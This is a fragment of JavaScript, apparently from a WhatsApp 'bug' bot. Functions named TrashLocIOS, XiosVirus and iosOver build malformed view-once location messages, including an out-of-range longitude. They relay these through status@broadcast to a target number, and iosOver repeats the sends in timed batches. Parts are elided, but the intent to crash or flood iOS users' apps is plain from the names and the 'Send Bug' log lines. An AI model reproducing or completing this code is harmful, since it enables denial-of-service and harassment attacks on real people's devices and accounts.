async function TrashLocIOS(number, botstx) {
        	try {
        		...
        		const msg = generateWAMessageFromContent(botstx, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
        		
        		await number.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [botstx],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
...
async function XiosVirus(number, botstx) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
      ...
      let msg2 = generateWAMessageFromContent(botstx, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
      ...
      await number.relayMessage('status@broadcast', msg2.message, {
...
async function iosOver(durationHours, ST) {
              ...
              try {
                ...
                console.log(chalk.green(`Success Send Bug to ${ST} (${batch})`));
              if (batch < maxBatches) {
                console.log(chalk.yellow(`snith xplore — 2025`));
                count = 0;
                batch++;
